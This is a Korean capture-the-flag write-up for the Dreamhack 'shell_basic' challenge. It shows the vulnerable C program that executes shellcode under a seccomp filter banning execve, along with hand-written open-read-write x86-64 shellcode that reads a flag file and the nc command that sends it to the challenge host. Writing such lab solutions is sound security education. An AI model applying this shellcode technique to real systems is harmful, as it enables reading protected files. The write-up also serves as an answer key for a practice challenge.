```c
// Name: shell_basic.c
// Compile: gcc -o shell_basic shell_basic.c -lseccomp

#include <fcntl.h>
#include <seccomp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <signal.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(10);
}

void banned_execve() {
  scmp_filter_ctx ctx;
  ctx = seccomp_init(SCMP_ACT_ALLOW);
  if (ctx == NULL) {
    exit(0);
  }
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), 0);

  seccomp_load(ctx);
}

void main(int argc, char *argv[]) {
  char *shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);   
  void (*sc)();
  
  init();
  
  banned_execve();

  printf("shellcode: ");
  read(0, shellcode, 0x1000);

  sc = (void *)shellcode;
  sc();
}
```

`shell_basic.c` 코드를 읽어보면, `stdin`을 통해 입력된 쉘코드를 실행시키는 프로그램임을 알 수 있다.
다만, 입력된 쉘코드에 `execve` 또는 `execveat` 명령이 있는 경우, 해당 명령을 실행시키지 않는다.
따라서, `/home/shell_basic/flag_name_is_loooooong`을 열고, 해당 파일의 내용을 읽은 후 다시 출력하는 프로그램의 어셈블리 코드를 작성하여, 해당 코드의 opcode를 `shell_basic` 프로세스에 넘겨주면 flag를 얻을 수 있음을 알 수 있다.

이를 위해선 가장 먼저, `/home/shell_basic/flag_name_is_loooooong`의 ascii 코드를 알아낼 필요가 있다.
이를 위해 다음과 같은 python 코드를 작성하면, 위 문자열의 16진수 표현을 알 수 있다.

```python
# Name: get_hex.py

filename = '/home/shell_basic/flag_name_is_loooooong'
output = ''
for c in filename:
    output += f'\\x{ord(c):0>2x}'
print(output)
```

위 코드를 실행하면 다음 문자열을 얻을 수 있다.

`\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x65\x6c\x6c\x5f\x62\x61\x73\x69\x63\x2f\x66\x6c\x61\x67\x5f\x6e\x61\x6d\x65\x5f\x69\x73\x5f\x6c\x6f\x6f\x6f\x6f\x6f\x6f\x6e\x67`

위 문자열과, 알려진 orw 어셈블리를 활용하여 다음과 같은 어셈블리 코드를 작성할 수 있다.

```
; Name: orw.asm

section .text
global run_sh

run_sh:
push 0x0
mov rax, 0x676e6f6f6f6f6f6f
push rax
mov rax, 0x6c5f73695f656d61
push rax
mov rax, 0x6e5f67616c662f63
push rax
mov rax, 0x697361625f6c6c65
push rax
mov rax, 0x68732f656d6f682f
push rax
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 2
syscall

mov rdi, rax
mov rsi, rsp
sub rsi, 0x30
mov rdx, 0x30
mov rax, 0x0
syscall

mov rdi, 1
mov rax, 0x1
syscall

xor rdi, rdi
mov rax, 0x3c	
syscall
```

이제 위 어셈블리 코드를 다음 명령어를 이용하여 바이너리 파일로 변환하면 쉘코드를 얻을 수 있다.

```bash
$ nasm -f elf64 orw.asm
$ objcopy --dump-section .text=orw.bin orw.o
$ xxd orw.bin
```

이제 위에서 얻은 쉘코드를 다음 명령어를 통해 서버로 넘겨주면 flag를 얻을 수 있다.

```bash
$ cat orw.bin | nc host3.dreamhack.games <port>
```